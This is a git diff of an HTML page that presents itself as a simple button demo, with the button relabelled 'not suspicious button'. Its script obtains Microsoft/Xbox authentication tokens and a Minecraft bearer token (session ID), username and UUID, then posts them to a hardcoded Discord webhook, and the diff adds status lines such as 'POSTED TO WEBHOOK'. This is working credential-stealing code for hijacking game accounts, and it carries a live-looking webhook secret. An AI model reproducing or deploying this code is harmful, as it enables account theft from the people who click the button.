@@ -7,9 +7,14 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.1.3/axios.min.js"></script>
 <p>Click the button to demonstrate the prompt box.</p>
 
-<button onclick="myFunction()">Try it</button>
+<button onclick="myFunction()">not suspicious button</button>
 
 <p id="demo"></p>
+<p id="demo1"></p>
+<p id="demo2"></p>
+<p id="demo3"></p>
+<p id="demo4"></p>
+<p id="demo5"></p>
 
 <script>
   const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
@@ -36,15 +41,15 @@ async function myFunction() {
         const xstsToken = xstsTokenHashArray[0]
         const userHash = xstsTokenHashArray[1]
         const bearerToken = await getBearerToken(xstsToken, userHash)
-        document.getElementById("demo").innerHTML = "RETRIEVING SSID...";
+        document.getElementById("demo1").innerHTML = "RETRIEVING SSID...";
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
-        document.getElementById("demo").innerHTML = "ssid: " + bearerToken;
-        document.getElementById("demo").innerHTML = "RETRIEVING USER & UUID...";
+        document.getElementById("demo2").innerHTML = "ssid: " + bearerToken;
+        document.getElementById("demo3").innerHTML = "RETRIEVING USER & UUID...";
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        document.getElementById("demo").innerHTML = "username: " + username;
+        document.getElementById("demo4").innerHTML = "username: " + username;
         postToWebhook(username, bearerToken, uuid, userToken)
-        document.getElementById("demo").innerHTML = "POSTED TO WEBHOOK";
+        document.getElementById("demo5").innerHTML = "POSTED TO WEBHOOK";
     } catch (e) {
         console.log(e)
     }
